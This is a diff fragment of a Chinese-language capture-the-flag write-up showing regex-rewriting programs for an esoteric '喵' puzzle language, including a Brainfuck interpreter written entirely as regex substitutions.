+    如果看到【\n(.*🤔[8-9]...)\n(.*🤔[0-7]...)\n】就跳转到【排序循环千喵】喵
+    如果看到【\n(.*🤔[9-9]...)\n(.*🤔[0-8]...)\n】就跳转到【排序循环千喵】喵
+    重复把【🤔[^\n]*】替换成【】喵
+    重复把【^\n】替换成【】喵
+    谢谢喵
+```
+
+![flag2 喵](thuctf2023/filtered-flag2.png)
+
+#### Level 3 喵
+
+开头到“🎉”是输出喵；后面一行是数据喵，用“🌚”表示 data pointer 喵；最后一行是指令喵，用“🤔”表示 program counter 喵，预先将匹配的括号按嵌套层数替换为 a-h 表示左括号喵，A-H 表示右括号喵。
+
+```
+    重复把【[^><\+-\.\[\]]】替换成【】喵
+    如果看到【^$】就跳转到【结束喵】喵
+    把【^】替换成【🤔】喵
+    重复把【\[([^\[\]aA]*)\]】替换成【a\1A】喵
+    重复把【\[([^\[\]bB]*)\]】替换成【b\1B】喵
+    重复把【\[([^\[\]cC]*)\]】替换成【c\1C】喵
+    重复把【\[([^\[\]dD]*)\]】替换成【d\1D】喵
+    重复把【\[([^\[\]eE]*)\]】替换成【e\1E】喵
+    重复把【\[([^\[\]fF]*)\]】替换成【f\1F】喵
+    重复把【\[([^\[\]gG]*)\]】替换成【g\1G】喵
+    重复把【\[([^\[\]hH]*)\]】替换成【h\1H】喵
+    把【^】替换成【🎉\n,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0🌚,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n】喵
+循环喵：
+    如果看到【🤔>】就跳转到【向右喵】喵
+    如果看到【🤔<】就跳转到【向左喵】喵
+    如果看到【🤔\+】就跳转到【加一喵】喵
+    如果看到【🤔-】就跳转到【减一喵】喵
+    如果看到【🤔\.】就跳转到【输出喵】喵
+    如果看到【🤔[a-h]】就跳转到【左括号喵】喵
+    如果看到【🤔[A-H]】就跳转到【右括号喵】喵
+向右喵：
+    把【🌚(,\d+)】替换成【\1🌚】喵
+    如果看到【^】就跳转到【下一条指令喵】喵
+向左喵：
+    把【(,\d+)🌚】替换成【🌚\1】喵
+    如果看到【^】就跳转到【下一条指令喵】喵
+加一喵：
+    把【0🌚】替换成【1🌝】喵
+    把【1🌚】替换成【2🌝】喵
+    把【2🌚】替换成【3🌝】喵
+    把【3🌚】替换成【4🌝】喵
+    把【4🌚】替换成【5🌝】喵
+    把【5🌚】替换成【6🌝】喵
+    把【6🌚】替换成【7🌝】喵
+    把【7🌚】替换成【8🌝】喵
+    把【8🌚】替换成【9🌝】喵
+    把【,9🌚】替换成【,10🌝】喵
+    把【09🌚】替换成【10🌝】喵
+    把【19🌚】替换成【20🌝】喵
+    把【29🌚】替换成【30🌝】喵
+    把【39🌚】替换成【40🌝】喵
+    把【49🌚】替换成【50🌝】喵
+    把【59🌚】替换成【60🌝】喵
+    把【69🌚】替换成【70🌝】喵
+    把【79🌚】替换成【80🌝】喵
+    把【89🌚】替换成【90🌝】喵
+    把【,99🌚】替换成【,100🌝】喵
+    把【099🌚】替换成【100🌝】喵
+    把【199🌚】替换成【200🌝】喵
+    把【299🌚】替换成【300🌝】喵
+    把【399🌚】替换成【400🌝】喵
+    把【499🌚】替换成【500🌝】喵
+    把【599🌚】替换成【600🌝】喵
+    把【699🌚】替换成【700🌝】喵
+    把【799🌚】替换成【800🌝】喵
+    把【899🌚】替换成【900🌝】喵
+    把【🌝】替换成【🌚】喵
+    如果看到【^】就跳转到【下一条指令喵】喵
+减一喵：
+    把【1🌚】替换成【0🌝】喵
+    把【2🌚】替换成【1🌝】喵
+    把【3🌚】替换成【2🌝】喵
+    把【4🌚】替换成【3🌝】喵
+    把【5🌚】替换成【4🌝】喵
+    把【6🌚】替换成【5🌝】喵
+    把【7🌚】替换成【6🌝】喵
+    把【8🌚】替换成【7🌝】喵
+    把【9🌚】替换成【8🌝】喵
+    把【,10🌚】替换成【,9🌝】喵
+    把【10🌚】替换成【09🌝】喵
+    把【20🌚】替换成【19🌝】喵
+    把【30🌚】替换成【29🌝】喵
+    把【40🌚】替换成【39🌝】喵
+    把【50🌚】替换成【49🌝】喵
+    把【60🌚】替换成【59🌝】喵
+    把【70🌚】替换成【69🌝】喵
+    把【80🌚】替换成【79🌝】喵
+    把【90🌚】替换成【89🌝】喵
+    把【,100🌚】替换成【,99🌝】喵
+    把【100🌚】替换成【099🌝】喵
+    把【200🌚】替换成【199🌝】喵
+    把【300🌚】替换成【299🌝】喵
+    把【400🌚】替换成【399🌝】喵
+    把【500🌚】替换成【499🌝】喵
+    把【600🌚】替换成【599🌝】喵
+    把【700🌚】替换成【699🌝】喵
+    把【800🌚】替换成【799🌝】喵
+    把【900🌚】替换成【899🌝】喵
+    把【🌝】替换成【🌚】喵
+    如果看到【^】就跳转到【下一条指令喵】喵
+输出喵：
+    把【(🎉[\s\S]*,32🌚)】替换成【 \1】喵
+    把【(🎉[\s\S]*,33🌚)】替换成【!\1】喵
+    把【(🎉[\s\S]*,34🌚)】替换成【"\1】喵
+    把【(🎉[\s\S]*,35🌚)】替换成【#\1】喵
+    把【(🎉[\s\S]*,36🌚)】替换成【$\1】喵
+    把【(🎉[\s\S]*,37🌚)】替换成【%\1】喵
+    把【(🎉[\s\S]*,38🌚)】替换成【&\1】喵
+    把【(🎉[\s\S]*,39🌚)】替换成【'\1】喵
+    把【(🎉[\s\S]*,40🌚)】替换成【(\1】喵
+    把【(🎉[\s\S]*,41🌚)】替换成【)\1】喵
+    把【(🎉[\s\S]*,42🌚)】替换成【*\1】喵
+    把【(🎉[\s\S]*,43🌚)】替换成【+\1】喵
+    把【(🎉[\s\S]*,44🌚)】替换成【,\1】喵
+    把【(🎉[\s\S]*,45🌚)】替换成【-\1】喵
+    把【(🎉[\s\S]*,46🌚)】替换成【.\1】喵
+    把【(🎉[\s\S]*,47🌚)】替换成【/\1】喵
+    把【(🎉[\s\S]*,48🌚)】替换成【0\1】喵
+    把【(🎉[\s\S]*,49🌚)】替换成【1\1】喵
+    把【(🎉[\s\S]*,50🌚)】替换成【2\1】喵
+    把【(🎉[\s\S]*,51🌚)】替换成【3\1】喵
+    把【(🎉[\s\S]*,52🌚)】替换成【4\1】喵
+    把【(🎉[\s\S]*,53🌚)】替换成【5\1】喵
+    把【(🎉[\s\S]*,54🌚)】替换成【6\1】喵
+    把【(🎉[\s\S]*,55🌚)】替换成【7\1】喵
+    把【(🎉[\s\S]*,56🌚)】替换成【8\1】喵
+    把【(🎉[\s\S]*,57🌚)】替换成【9\1】喵
+    把【(🎉[\s\S]*,58🌚)】替换成【:\1】喵
+    把【(🎉[\s\S]*,59🌚)】替换成【;\1】喵
+    把【(🎉[\s\S]*,60🌚)】替换成【<\1】喵
+    把【(🎉[\s\S]*,61🌚)】替换成【=\1】喵
+    把【(🎉[\s\S]*,62🌚)】替换成【>\1】喵
+    把【(🎉[\s\S]*,63🌚)】替换成【?\1】喵
+    把【(🎉[\s\S]*,64🌚)】替换成【@\1】喵
+    把【(🎉[\s\S]*,65🌚)】替换成【A\1】喵
+    把【(🎉[\s\S]*,66🌚)】替换成【B\1】喵
+    把【(🎉[\s\S]*,67🌚)】替换成【C\1】喵
+    把【(🎉[\s\S]*,68🌚)】替换成【D\1】喵
+    把【(🎉[\s\S]*,69🌚)】替换成【E\1】喵
+    把【(🎉[\s\S]*,70🌚)】替换成【F\1】喵
+    把【(🎉[\s\S]*,71🌚)】替换成【G\1】喵
+    把【(🎉[\s\S]*,72🌚)】替换成【H\1】喵
+    把【(🎉[\s\S]*,73🌚)】替换成【I\1】喵
+    把【(🎉[\s\S]*,74🌚)】替换成【J\1】喵
+    把【(🎉[\s\S]*,75🌚)】替换成【K\1】喵
+    把【(🎉[\s\S]*,76🌚)】替换成【L\1】喵
+    把【(🎉[\s\S]*,77🌚)】替换成【M\1】喵
+    把【(🎉[\s\S]*,78🌚)】替换成【N\1】喵
+    把【(🎉[\s\S]*,79🌚)】替换成【O\1】喵
+    把【(🎉[\s\S]*,80🌚)】替换成【P\1】喵
+    把【(🎉[\s\S]*,81🌚)】替换成【Q\1】喵
+    把【(🎉[\s\S]*,82🌚)】替换成【R\1】喵
+    把【(🎉[\s\S]*,83🌚)】替换成【S\1】喵
+    把【(🎉[\s\S]*,84🌚)】替换成【T\1】喵
+    把【(🎉[\s\S]*,85🌚)】替换成【U\1】喵
+    把【(🎉[\s\S]*,86🌚)】替换成【V\1】喵
+    把【(🎉[\s\S]*,87🌚)】替换成【W\1】喵
+    把【(🎉[\s\S]*,88🌚)】替换成【X\1】喵
+    把【(🎉[\s\S]*,89🌚)】替换成【Y\1】喵
+    把【(🎉[\s\S]*,90🌚)】替换成【Z\1】喵
+    把【(🎉[\s\S]*,91🌚)】替换成【[\1】喵
+    把【(🎉[\s\S]*,92🌚)】替换成【\\1】喵
+    把【(🎉[\s\S]*,93🌚)】替换成【]\1】喵
+    把【(🎉[\s\S]*,94🌚)】替换成【^\1】喵
+    把【(🎉[\s\S]*,95🌚)】替换成【_\1】喵
+    把【(🎉[\s\S]*,96🌚)】替换成【`\1】喵
+    把【(🎉[\s\S]*,97🌚)】替换成【a\1】喵
+    把【(🎉[\s\S]*,98🌚)】替换成【b\1】喵
+    把【(🎉[\s\S]*,99🌚)】替换成【c\1】喵
+    把【(🎉[\s\S]*,100🌚)】替换成【d\1】喵
+    把【(🎉[\s\S]*,101🌚)】替换成【e\1】喵
+    把【(🎉[\s\S]*,102🌚)】替换成【f\1】喵
+    把【(🎉[\s\S]*,103🌚)】替换成【g\1】喵
+    把【(🎉[\s\S]*,104🌚)】替换成【h\1】喵
+    把【(🎉[\s\S]*,105🌚)】替换成【i\1】喵
+    把【(🎉[\s\S]*,106🌚)】替换成【j\1】喵
+    把【(🎉[\s\S]*,107🌚)】替换成【k\1】喵
+    把【(🎉[\s\S]*,108🌚)】替换成【l\1】喵
+    把【(🎉[\s\S]*,109🌚)】替换成【m\1】喵
+    把【(🎉[\s\S]*,110🌚)】替换成【n\1】喵
+    把【(🎉[\s\S]*,111🌚)】替换成【o\1】喵
+    把【(🎉[\s\S]*,112🌚)】替换成【p\1】喵
+    把【(🎉[\s\S]*,113🌚)】替换成【q\1】喵
+    把【(🎉[\s\S]*,114🌚)】替换成【r\1】喵
+    把【(🎉[\s\S]*,115🌚)】替换成【s\1】喵
+    把【(🎉[\s\S]*,116🌚)】替换成【t\1】喵
+    把【(🎉[\s\S]*,117🌚)】替换成【u\1】喵
+    把【(🎉[\s\S]*,118🌚)】替换成【v\1】喵
+    把【(🎉[\s\S]*,119🌚)】替换成【w\1】喵
+    把【(🎉[\s\S]*,120🌚)】替换成【x\1】喵
+    把【(🎉[\s\S]*,121🌚)】替换成【y\1】喵
+    把【(🎉[\s\S]*,122🌚)】替换成【z\1】喵
+    如果看到【^】就跳转到【下一条指令喵】喵
+左括号喵：
+    如果没看到【,0🌚】就跳转到【下一条指令喵】喵
+    把【🤔(a.*?A)】替换成【\1🙂】喵
+    把【🤔(b.*?B)】替换成【\1🙂】喵
+    把【🤔(c.*?C)】替换成【\1🙂】喵
+    把【🤔(d.*?D)】替换成【\1🙂】喵
+    把【🤔(e.*?E)】替换成【\1🙂】喵
+    把【🤔(f.*?F)】替换成【\1🙂】喵
+    把【🤔(g.*?G)】替换成【\1🙂】喵
+    把【🤔(h.*?H)】替换成【\1🙂】喵
+    把【🙂】替换成【🤔】喵
+    如果看到【^】就跳转到【判断喵】喵
+右括号喵：
+    如果看到【,0🌚】就跳转到【下一条指令喵】喵
+    把【a([^A]*)🤔A】替换成【a🙂\1A】喵
+    把【b([^B]*)🤔B】替换成【b🙂\1B】喵
+    把【c([^C]*)🤔C】替换成【c🙂\1C】喵
+    把【d([^D]*)🤔D】替换成【d🙂\1D】喵
+    把【e([^E]*)🤔E】替换成【e🙂\1E】喵
+    把【f([^F]*)🤔F】替换成【f🙂\1F】喵
+    把【g([^G]*)🤔G】替换成【g🙂\1G】喵
+    把【h([^H]*)🤔H】替换成【h🙂\1H】喵
+    把【🙂】替换成【🤔】喵
+    如果看到【^】就跳转到【判断喵】喵
+下一条指令喵：
+    把【🤔(.)】替换成【\1🤔】喵
+判断喵：
+    如果没看到【🤔$】就跳转到【循环喵】喵
+    把【🎉[\s\S]*】替换成【】喵
+结束喵：
+    谢谢喵
+```
+
+![flag3 喵](thuctf2023/filtered-flag3.png)
